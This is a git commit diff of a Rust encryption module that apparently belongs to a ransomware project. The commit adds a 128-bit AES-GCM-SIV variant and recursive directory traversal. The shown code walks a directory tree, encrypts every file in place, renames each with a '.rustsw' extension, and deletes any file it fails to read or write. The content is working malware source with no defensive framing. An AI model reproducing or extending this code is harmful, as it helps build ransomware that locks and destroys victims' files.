899a84887ec9ce850e2dfe3a5129a398d075e107
Obscurely <adrian.obscurely@protonmail.com>
2022-02-24 18:24:38 +0200

    before implementing 128 bits encyrption aswell

--- src/encryption/encryptor.rs
+++ src/encryption/encryptor.rs
@@ -2,26 +2,32 @@ use aes_gcm_siv::aead::consts::{B0, B1};
 use aes_gcm_siv::aead::generic_array::typenum::{UInt, UTerm};
 use aes_gcm_siv::aead::generic_array::GenericArray;
 use aes_gcm_siv::aead::{Aead, NewAead};
-use aes_gcm_siv::{Aes256GcmSiv, Key, Nonce};
+use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
 use rand::prelude::*;
 use rand_hc::Hc128Rng;
 use std::fs;
 use std::path;
+use walkdir::WalkDir;
 
 const ENCRYPTED_EXTENSION: &str = ".rustsw";
 
-pub struct Encryptor {
+pub struct Encryptor256bit {
     nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
     cipher: Aes256GcmSiv,
 }
 
-impl Encryptor {
-    pub fn from(key_bytes: [u8; 32], nonce_bytes: [u8; 12]) -> Encryptor {
+pub struct Encryptor128bit {
+    nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
+    cipher: Aes128GcmSiv,
+}
+
+impl Encryptor256bit {
+    pub fn from(key_bytes: [u8; 32], nonce_bytes: [u8; 12]) -> Encryptor256bit {
         let key = Key::from(key_bytes);
         let cipher = Aes256GcmSiv::new(&key);
         let nonce = Nonce::from(nonce_bytes);
 
-        Encryptor { nonce, cipher }
+        Encryptor256bit { nonce, cipher }
     }
 
     pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
@@ -35,7 +41,7 @@ impl Encryptor {
         let bytes_to_encrypt = match fs::read(&path) {
             Ok(bytes) => bytes,
             Err(_) => {
-                attempt_delete_file(&path);
+                self.attempt_delete_file(&path);
                 return;
             }
         };
@@ -44,18 +50,15 @@ impl Encryptor {
         match fs::write(&path, bytes_encrypted) {
             Ok(_) => (),
             Err(_) => {
-                attempt_delete_file(&path);
+                self.attempt_delete_file(&path);
             }
         };
     }
 
     pub fn encrypt_dir(&self, dir: &String) -> bool {
-        let files = match fs_extra::dir::get_dir_content(&dir) {
-            Ok(content) => content.files,
-            Err(_) => return false,
-        };
+        let files = self.get_files_recursively(&dir);
 
-        encrypt_files(&files, &self);
+        self.encrypt_files(&files);
         true
     }
 
@@ -70,23 +73,23 @@ impl Encryptor {
             };
         }
     }
-}
 
-fn attempt_delete_file(path: &String) {
-    match fs::remove_file(path) {
-        Ok(_) => (),
-        Err(_) => (),
-    };
-}
-
-fn encrypt_files(files: &Vec<String>, encryptor: &Encryptor) {
-    for file in files {
-        println!("Name: {}", &file); // HACK DEBUG print
-        encryptor.encrypt_file_else_delete(&file);
-
-        match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
+    fn attempt_delete_file(&self, path: &String) {
+        match fs::remove_file(path) {
             Ok(_) => (),
             Err(_) => (),
         };
+    }
+
+    fn get_files_recursively(&self, path: &String) -> Vec<String> {
+        let mut files: Vec<String> = vec![];
+
+        for file in WalkDir::new(&path).into_iter().filter_map(|file| file.ok()) {
+            if file.metadata().unwrap().is_file() {
+                files.push(file.path().display().to_string());
+            }
+        }
+
+        files
     }
 }
